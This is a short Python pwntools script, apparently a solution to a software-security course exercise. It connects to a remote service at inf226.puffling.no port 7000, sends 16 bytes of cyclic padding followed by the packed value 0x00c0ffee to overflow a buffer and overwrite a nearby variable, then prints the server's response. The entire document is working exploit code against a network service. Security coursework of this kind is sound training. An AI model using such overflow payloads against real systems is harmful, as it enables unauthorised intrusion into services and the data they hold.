from pwn import *

io = remote('inf226.puffling.no', 7000)


io.send(cyclic(16) + p32(0x00c0ffee)) 

io.shutdown('out')
print(io.readall())

